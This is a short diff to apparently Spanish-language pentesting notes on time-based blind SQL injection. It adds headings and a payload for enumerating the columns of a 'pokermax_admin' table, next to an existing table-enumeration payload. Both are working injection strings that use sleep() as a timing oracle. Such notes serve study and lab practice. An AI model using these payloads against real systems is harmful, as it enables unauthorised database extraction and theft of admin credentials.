@@ -132,8 +132,15 @@ admin' and if(substr((select group_concat(schema_name) from information_schema.s
 
 Entonces si ya tienes la BD, por ej `pokerleague`
 
+##### Enumerar Tablas de una base de datos
+
 ```sql
 admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{pos},1)='{caracter}',sleep(0.9),1)-- -
+```
+
+##### Eenumerar columnas de una tabla de una BD
+```sql
+admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -
 ```
 ### Identificar la Base de Datos Actual
 
